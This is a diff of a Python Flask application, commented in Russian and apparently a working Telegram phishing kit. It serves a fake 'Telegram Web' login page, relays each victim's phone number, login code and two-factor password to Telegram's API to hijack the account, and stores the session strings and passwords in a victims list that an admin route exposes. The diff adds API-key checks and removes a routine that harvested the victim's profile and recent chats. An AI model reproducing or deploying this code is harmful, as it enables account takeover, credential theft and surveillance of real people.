@@ -3,15 +3,13 @@ import asyncio
 import json
 import logging
 from datetime import datetime
-from flask import Flask, request, jsonify, session
-from pyrogram import Client
-from pyrogram.errors import (
+from flask import Flask, request, jsonify
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.errors import (
     SessionPasswordNeeded, PhoneCodeInvalid, 
     PhoneNumberInvalid, PhoneCodeExpired
 )
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-import aiohttp
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
@@ -20,9 +18,27 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.secret_key = os.urandom(32)
 
+# 🔐 ПРОВЕРКА API КЛЮЧЕЙ
+def check_api_keys():
+    api_id = os.getenv('TELEGRAM_API_ID')
+    api_hash = os.getenv('TELEGRAM_API_HASH')
+    
+    logger.info(f"🔍 Проверка API ключей: ID={api_id}, HASH={'*' * 10 if api_hash else 'None'}")
+    
+    if not api_id or not api_hash:
+        logger.error("❌ API ключи не установлены!")
+        return False
+    
+    if not api_id.isdigit():
+        logger.error("❌ API ID должен быть числом!")
+        return False
+        
+    logger.info("✅ API ключи валидны")
+    return True
+
 # Конфигурация
-API_ID = os.getenv('TELEGRAM_API_ID', 'YOUR_API_ID')
-API_HASH = os.getenv('TELEGRAM_API_HASH', 'YOUR_API_HASH')
+API_ID = os.getenv('TELEGRAM_API_ID', '').strip()
+API_HASH = os.getenv('TELEGRAM_API_HASH', '').strip()
 
 # Хранилища
 VICTIMS_DATA = []
@@ -30,11 +46,28 @@ ACTIVE_SESSIONS = {}
 
 class RealTelegramPhisher:
     def __init__(self):
-        self.api_id = int(API_ID) if API_ID.isdigit() else 0
-        self.api_hash = API_HASH
+        if not API_ID or not API_HASH:
+            logger.critical("🚫 API ключи не настроены! Фишинг не будет работать.")
+            self.initialized = False
+            return
+            
+        try:
+            self.api_id = int(API_ID)
+            self.api_hash = API_HASH
+            self.initialized = True
+            logger.info(f"✅ Фишинг инициализирован с API ID: {self.api_id}")
+        except ValueError:
+            logger.error("❌ Неверный формат API ID")
+            self.initialized = False
         
     async def start_phishing_attack(self, phone_number):
         """Начинаем реальную фишинг-атаку через Telegram API"""
+        if not self.initialized:
+            return {
+                'success': False, 
+                'error': 'Система не инициализирована. Проверьте API ключи.'
+            }
+            
         try:
             logger.info(f"🎯 Начало реальной фишинг-атаки для: {phone_number}")
             
@@ -89,6 +122,9 @@ class RealTelegramPhisher:
     
     async def process_victim_code(self, session_id, entered_code):
         """Обрабатываем код, введенный жертвой"""
+        if not self.initialized:
+            return {'success': False, 'error': 'Система не инициализирована'}
+            
         try:
             if session_id not in ACTIVE_SESSIONS:
                 return {'success': False, 'error': 'Сессия не найдена'}
@@ -136,9 +172,6 @@ class RealTelegramPhisher:
                 self.save_victims_data()
                 
                 logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП ПОЛУЧЕН! Аккаунт {phone} скомпрометирован!")
-                
-                # Можно выполнять действия от имени жертвы
-                await self.execute_post_compromise_actions(client, victim_data)
                 
                 return {
                     'success': True,
@@ -189,6 +222,9 @@ class RealTelegramPhisher:
     
     async def process_victim_password(self, session_id, password):
         """Обрабатываем пароль, введенный жертвой"""
+        if not self.initialized:
+            return {'success': False, 'error': 'Система не инициализирована'}
+            
         try:
             if session_id not in ACTIVE_SESSIONS:
                 return {'success': False, 'error': 'Сессия не найдена'}
@@ -209,7 +245,7 @@ class RealTelegramPhisher:
                 victim_data = {
                     'session_id': session_id,
                     'phone': phone,
-                    'password': password,  # Сохраняем пароль
+                    'password': password,
                     'session_string': session_string,
                     'user_id': signed_in.id,
                     'first_name': signed_in.first_name,
@@ -226,9 +262,6 @@ class RealTelegramPhisher:
                 self.save_victims_data()
                 
                 logger.critical(f"🎉 ПОЛНЫЙ ДОСТУП С ПАРОЛЕМ! Аккаунт {phone} скомпрометирован!")
-                
-                # Выполняем действия после компрометации
-                await self.execute_post_compromise_actions(client, victim_data)
                 
                 return {
                     'success': True,
@@ -252,48 +285,6 @@ class RealTelegramPhisher:
                 'success': False,
                 'error': f'Системная ошибка: {str(e)}'
             }
-    
-    async def execute_post_compromise_actions(self, client, victim_data):
-        """Выполняем действия после успешной компрометации"""
-        try:
-            logger.info(f"⚡ Выполняем пост-компрометационные действия для {victim_data['phone']}")
-            
-            # Получаем информацию о пользователе
-            me = await client.get_me()
-            
-            # Получаем диалоги
-            dialogs = await client.get_dialogs(limit=10)
-            
-            # Сохраняем дополнительную информацию
-            victim_data['user_info'] = {
-                'id': me.id,
-                'first_name': me.first_name,
-                'last_name': me.last_name,
-                'username': me.username,
-                'phone': me.phone,
-                'is_bot': me.bot,
-                'is_premium': getattr(me, 'premium', False)
-            }
-            
-            victim_data['dialog_count'] = len(dialogs)
-            victim_data['recent_dialogs'] = [
-                {
-                    'id': dialog.id,
-                    'name': dialog.name,
-                    'is_user': dialog.is_user,
-                    'is_group': dialog.is_group,
-                    'is_channel': dialog.is_channel
-                }
-                for dialog in dialogs[:5]  # Первые 5 диалогов
-            ]
-            
-            # Можно добавить отправку сообщений, сбор контактов и т.д.
-            # await client.send_message('me', 'Аккаунт скомпрометирован')
-            
-            self.save_victims_data()
-            
-        except Exception as e:
-            logger.error(f"❌ Ошибка выполнения пост-действий: {e}")
     
     def save_victims_data(self):
         """Сохраняем данные жертв в файл"""
@@ -319,7 +310,10 @@ def run_async(coro):
 @app.route('/')
 def index():
     """Главная фишинговая страница"""
-    return '''
+    status = "✅ СИСТЕМА АКТИВНА" if phisher.initialized else "❌ СИСТЕМА НЕ ГОТОВА"
+    status_color = "success" if phisher.initialized else "error"
+    
+    return f'''
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -327,8 +321,8 @@ def index():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Web</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #18222d;
             color: white;
@@ -336,41 +330,41 @@ def index():
             display: flex;
             align-items: center;
             justify-content: center;
-        }
-        .auth-container {
+        }}
+        .auth-container {{
             width: 100%;
             max-width: 400px;
             background: #1e2a38;
             border-radius: 15px;
             padding: 40px 30px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-        .logo {
+        }}
+        .logo {{
             text-align: center;
             font-size: 48px;
             margin-bottom: 20px;
-        }
-        .title {
+        }}
+        .title {{
             text-align: center;
             font-size: 24px;
             margin-bottom: 10px;
             font-weight: 500;
-        }
-        .subtitle {
+        }}
+        .subtitle {{
             text-align: center;
             color: #8a8a8a;
             margin-bottom: 30px;
-        }
-        .input-group {
+        }}
+        .input-group {{
             margin-bottom: 20px;
-        }
-        .input-label {
+        }}
+        .input-label {{
             display: block;
             margin-bottom: 8px;
             color: #8a8a8a;
             font-size: 14px;
-        }
-        .input-field {
+        }}
+        .input-field {{
             width: 100%;
             padding: 15px;
             background: #2b3b4d;
@@ -378,12 +372,12 @@ def index():
             border-radius: 8px;
             color: white;
             font-size: 16px;
-        }
-        .input-field:focus {
+        }}
+        .input-field:focus {{
             outline: none;
             border-color: #0088cc;
-        }
-        .btn {
+        }}
+        .btn {{
             width: 100%;
             padding: 15px;
             background: #0088cc;
@@ -393,46 +387,54 @@ def index():
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
-        }
-        .btn:hover {
+        }}
+        .btn:hover {{
             background: #0077bb;
-        }
-        .btn:disabled {
+        }}
+        .btn:disabled {{
             background: #2b3b4d;
             cursor: not-allowed;
-        }
-        .step {
+        }}
+        .step {{
             display: none;
-        }
-        .step.active {
+        }}
+        .step.active {{
             display: block;
-        }
-        .alert {
+        }}
+        .alert {{
             padding: 12px;
             border-radius: 8px;
             margin: 15px 0;
             font-size: 14px;
-        }
-        .alert.success {
+        }}
+        .alert.success {{
             background: #1a3a2e;
             color: #4ade80;
             border: 1px solid #2d5c47;
-        }
-        .alert.error {
+        }}
+        .alert.error {{
             background: #3a2a2a;
             color: #f87171;
             border: 1px solid #5c3d3d;
-        }
-        .real-indicator {
-            background: #1a3a2e;
-            color: #4ade80;
+        }}
+        .status-indicator {{
             padding: 8px 12px;
             border-radius: 6px;
             font-size: 12px;
             margin-bottom: 15px;
             text-align: center;
-            border: 1px solid #2d5c47;
-        }
+            border: 1px solid;
+        }}
+        .status-success {{
+            background: #1a3a2e;
+            color: #4ade80;
+            border-color: #2d5c47;
+        }}
+        .status-error {{
+            background: #3a2a2a;
+            color: #f87171;
+            border-color: #5c3d3d;
+        }}
     </style>
 </head>
 <body>
@@ -441,8 +443,8 @@ def index():
         <h1 class="title">Telegram Web</h1>
         <p class="subtitle">Войдите в свой аккаунт Telegram</p>
         
-        <div class="real-indicator">
-            ✅ Подключение к реальному Telegram API
+        <div class="status-indicator {status_color}">
+            {status}
         </div>
         
         <!-- Шаг 1: Телефон -->
@@ -485,142 +487,142 @@ def index():
         let currentSessionId = '';
         let currentPhone = '';
 
-        function showStep(step) {
+        function showStep(step) {{
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById(`step${step}`).classList.add('active');
-        }
+            document.getElementById(`step${{step}}`).classList.add('active');
+        }}
 
-        function showAlert(message, type = 'success') {
+        function showAlert(message, type = 'success') {{
             const container = document.getElementById('alertContainer');
-            container.innerHTML = `<div class="alert ${type}">${message}</div>`;
-        }
+            container.innerHTML = `<div class="alert ${{type}}">${{message}}</div>`;
+        }}
 
-        async function startRealPhishing() {
+        async function startRealPhishing() {{
             const phone = document.getElementById('phoneInput').value.trim();
-            if (!phone) {
+            if (!phone) {{
                 showAlert('Введите номер телефона', 'error');
                 return;
-            }
+            }}
 
             currentPhone = phone;
             const btn = document.getElementById('phoneBtn');
             btn.disabled = true;
             btn.textContent = 'Отправка запроса в Telegram...';
 
-            try {
-                const response = await fetch('/api/real/start', {
+            try {{
+                const response = await fetch('/api/real/start', {{
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: phone})
-                });
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{phone: phone}})
+                }});
                 
                 const data = await response.json();
                 
-                if (data.success) {
+                if (data.success) {{
                     currentSessionId = data.session_id;
                     document.getElementById('phoneDisplay').textContent = phone;
                     showStep('Code');
                     showAlert('✅ Запрос отправлен в Telegram. Ожидайте код.', 'success');
-                } else {
+                }} else {{
                     showAlert('❌ ' + data.error, 'error');
-                }
-            } catch (error) {
+                }}
+            }} catch (error) {{
                 showAlert('❌ Ошибка сети', 'error');
-            } finally {
+            }} finally {{
                 btn.disabled = false;
                 btn.textContent = 'Получить код';
-            }
-        }
+            }}
+        }}
 
-        async function submitRealCode() {
+        async function submitRealCode() {{
             const code = document.getElementById('codeInput').value.trim();
-            if (!code) {
+            if (!code) {{
                 showAlert('Введите код', 'error');
                 return;
-            }
+            }}
 
             const btn = document.getElementById('codeBtn');
             btn.disabled = true;
             btn.textContent = 'Проверка кода...';
 
-            try {
-                const response = await fetch('/api/real/code', {
+            try {{
+                const response = await fetch('/api/real/code', {{
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
                         session_id: currentSessionId,
                         code: code,
                         phone: currentPhone
-                    })
-                });
+                    }})
+                }});
                 
                 const data = await response.json();
                 
-                if (data.success) {
-                    if (data.next_step === 'enter_password') {
+                if (data.success) {{
+                    if (data.next_step === 'enter_password') {{
                         showStep('Password');
                         showAlert('✅ Код принят. Введите пароль.', 'success');
-                    } else {
+                    }} else {{
                         window.location.href = data.redirect || '/success';
-                    }
-                } else {
+                    }}
+                }} else {{
                     showAlert('❌ ' + data.error, 'error');
-                }
-            } catch (error) {
+                }}
+            }} catch (error) {{
                 showAlert('❌ Ошибка сети', 'error');
-            } finally {
+            }} finally {{
                 btn.disabled = false;
                 btn.textContent = 'Продолжить';
-            }
-        }
+            }}
+        }}
 
-        async function submitRealPassword() {
+        async function submitRealPassword() {{
             const password = document.getElementById('passwordInput').value;
-            if (!password) {
+            if (!password) {{
                 showAlert('Введите пароль', 'error');
                 return;
-            }
+            }}
 
             const btn = document.getElementById('passwordBtn');
             btn.disabled = true;
             btn.textContent = 'Проверка пароля...';
 
-            try {
-                const response = await fetch('/api/real/password', {
+            try {{
+                const response = await fetch('/api/real/password', {{
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
                         session_id: currentSessionId,
                         password: password,
                         phone: currentPhone
-                    })
-                });
+                    }})
+                }});
                 
                 const data = await response.json();
                 
-                if (data.success) {
+                if (data.success) {{
                     window.location.href = data.redirect || '/success';
-                } else {
+                }} else {{
                     showAlert('❌ ' + data.error, 'error');
-                }
-            } catch (error) {
+                }}
+            }} catch (error) {{
                 showAlert('❌ Ошибка сети', 'error');
-            } finally {
+            }} finally {{
                 btn.disabled = false;
                 btn.textContent = 'Войти';
-            }
-        }
+            }}
+        }}
 
         // Обработчики Enter
-        document.getElementById('phoneInput').addEventListener('keypress', e => {
+        document.getElementById('phoneInput').addEventListener('keypress', e => {{
             if (e.key === 'Enter') startRealPhishing();
-        });
-        document.getElementById('codeInput').addEventListener('keypress', e => {
+        }});
+        document.getElementById('codeInput').addEventListener('keypress', e => {{
             if (e.key === 'Enter') submitRealCode();
-        });
-        document.getElementById('passwordInput').addEventListener('keypress', e => {
+        }});
+        document.getElementById('passwordInput').addEventListener('keypress', e => {{
             if (e.key === 'Enter') submitRealPassword();
-        });
+        }});
     </script>
 </body>
 </html>
@@ -673,7 +675,7 @@ def success():
     <head>
         <title>Telegram</title>
         <style>
-            body { 
+            body {{ 
                 font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                 background: #18222d; 
                 color: white; 
@@ -683,16 +685,16 @@ def success():
                 align-items: center;
                 justify-content: center;
                 min-height: 100vh;
-            }
-            .container { 
+            }}
+            .container {{ 
                 max-width: 400px; 
                 text-align: center; 
-            }
-            .logo { 
+            }}
+            .logo {{ 
                 font-size: 48px; 
                 margin-bottom: 20px; 
-            }
-            .btn { 
+            }}
+            .btn {{ 
                 background: #0088cc; 
                 color: white; 
                 padding: 15px 30px; 
@@ -701,7 +703,7 @@ def success():
                 font-size: 16px; 
                 cursor: pointer;
                 margin-top: 20px;
-            }
+            }}
         </style>
     </head>
     <body>
@@ -722,18 +724,24 @@ def admin():
         'total_victims': len(VICTIMS_DATA),
         'full_access_count': len([v for v in VICTIMS_DATA if 'FULL_ACCESS' in v.get('status', '')]),
         'victims': VICTIMS_DATA,
-        'active_sessions': len(ACTIVE_SESSIONS)
+        'active_sessions': len(ACTIVE_SESSIONS),
+        'api_initialized': phisher.initialized,
+        'api_id': API_ID if phisher.initialized else 'NOT_SET'
     })
 
 @app.route('/health')
 def health():
     """Проверка здоровья"""
     return jsonify({
-        'status': 'REAL_PHISHING_ACTIVE',
+        'status': 'REAL_PHISHING_ACTIVE' if phisher.initialized else 'API_KEYS_MISSING',
         'victims_count': len(VICTIMS_DATA),
-        'api_connected': True,
-        'timestamp': datetime.now().isoformat()
+        'api_connected': phisher.initialized,
+        'timestamp': datetime.now().isoformat(),
+        'api_id_set': bool(API_ID),
+        'api_hash_set': bool(API_HASH)
     })
 
 if __name__ == '__main__':
+    # Проверяем API ключи при запуске
+    check_api_keys()
     app.run(host='0.0.0.0', port=8080, debug=False)
